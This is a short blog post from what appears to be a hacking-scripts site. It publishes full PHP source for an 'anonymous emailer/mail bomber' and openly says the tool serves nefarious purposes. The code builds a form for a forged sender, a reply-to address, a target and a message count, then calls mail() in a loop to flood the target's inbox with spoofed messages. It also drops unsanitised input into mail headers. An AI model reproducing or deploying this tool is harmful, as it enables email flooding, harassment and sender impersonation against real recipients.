---
id: 148
title: PHP Anonymous Emailer/Mail Bomber
author: admin
layout: post
guid: http://hackingscripts.com/?p=148
permalink: /php-anonymous-emailer/
categories:
  - PHP
tags:
  - Email bomber
  - PHP
---
Ok, so this isn&#8217;t really a hack script as such, but is also used for nefarious activities, and therefore is included here.


### PHP Anonymous Emailer/Mail Bomber Source Code

{% highlight php linenos %}<html>
<head>
  <title>PHP Anonymous Emailer/Mail Bomber</title>
<body bgcolor="black" text="white">
<form action="" method="post">
<br><font size="5" face="verdana">Sender</font><br>
<br>
   <font size="2" face="verdana"><b>Name:</b></font><br>
    <input name="from_name" type="text" value="" size="50">
    <br><br>
    <font size="2" face="verdana"><b>Email Adress:</b></font><br>
    <input name="from_mail" type="text" value="" size="50">
<br>
<br>
    <font size="2" face="verdana"><b>Reply Adress:</b></font><br>
    <input name="email_return" type="text" value="" size="50">
<br>
<br>
<br>
<br>
  </div>
  <font size="5" face="verdana">Recipient Details</font><br><br>
  <font size="2" face="verdana"><b>Recipient Email:</b>></font><br>
    <input name="target" type="text" size="50">
<br>
<br>
    <font size="2" face="verdana"><b>Subject:</b></font><br>
    <input name="subject" type="text" value="" size="50">
<br>
<br>
    <font size="2" face="verdana"><b>Message:</b></font><br>
    <textarea name="message" cols="38" rows="5"></textarea>
  <br><br><font size="2" face="verdana"><b>Number Of Messages To Send</b></font><p>
    <input name="messages" type="text" id="messages" value="" size="15">
<br>
<br>
    <input type=submit>
  </p>
</form>
   <?php
       $header="From:$from_name<$from_mail>\n";
       $header .= "Reply-To:$email_return\n";
       $message2 = stripcslashes($message);
       for($x=1;$x<$messages+1;$x++){
        mail($target,$subject,$message2,$header);
       }
   ?>
{% endhighlight %}